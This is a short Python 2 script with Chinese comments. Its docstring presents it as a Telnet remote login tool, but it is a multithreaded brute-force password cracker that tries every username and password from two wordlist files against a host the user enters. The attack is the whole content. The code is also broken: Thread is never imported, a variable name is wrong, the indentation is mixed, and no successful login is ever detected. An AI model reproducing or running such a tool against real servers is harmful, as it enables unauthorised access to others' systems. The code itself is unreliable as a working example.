# -*- coding: utf-8 -*- 

import telnetlib
import time

'''Telnet远程登录：Windows客户端连接Linux服务器'''


def Telnethack(user,passwd):
        # 连接Telnet服务器
	tn = telnetlib.Telnet(Host)

	# 输入登录用户名
	tn.read_until('login: ')
	tn.write(username + '\n')

	# 输入登录密码
	tn.read_until('Password:')
        tn.write(passwd + '\n')
	
if __name__ == "__main__":
	thrdlist = []
	Host=raw_input('Plz input HostIP:')
	userfile=raw_input('Plz input usernamefile:')
	passwdfile=raw_input('Plz input passwdfile:')
	users=open(userfile)
	passwds=open(passwdfile)
        for user in users.readlines():
                user=user.strip('\n')
                for passwd in passwds.readlines():
                        passwd=passwd.strip('\n')
                        t = Thread(target=Telnethack, args=(user, passwd))
                        t.start()
                        thrdlist.append(t)
                        time.sleep(0.009)
        for x in thrdlist:
                x.join()

